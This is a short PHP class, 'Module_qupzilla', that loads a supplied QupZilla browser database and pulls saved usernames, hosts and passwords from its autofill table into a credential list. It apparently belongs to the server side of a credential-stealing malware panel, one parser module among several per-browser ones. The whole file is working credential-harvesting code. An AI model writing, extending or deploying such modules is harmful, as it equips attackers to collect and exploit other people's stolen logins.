<?php

	class Module_qupzilla extends Module_
	{
		private function ProcessQUP($Data)
		{
			$FileDB = GetTempFile('qupzilla');
			if(!file_put_contents($FileDB, $Data))
				return FALSE;

			$db = new SQLite3($FileDB);
			if(!$db)
				return FALSE;

			$Data = $db->query('SELECT username, server, password FROM autofill');

			while($Element = $Data->fetchArray())
			{
				$User = Assign_($Element['username']);
				$Pass = Assign_($Element['password']);
				$Host = Assign_($Element['server']);

				$this->add_http($Host, $User, $Pass);
			}

			$db->close();
			DelFile($FileDB);
		}
			
		public function process_module($Data, $Version)
		{
			if(!class_exists("SQLite3"))
				return;
			switch ($Version)
			{
				case 0:
					$this->ProcessQUP($Data);
					break;
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}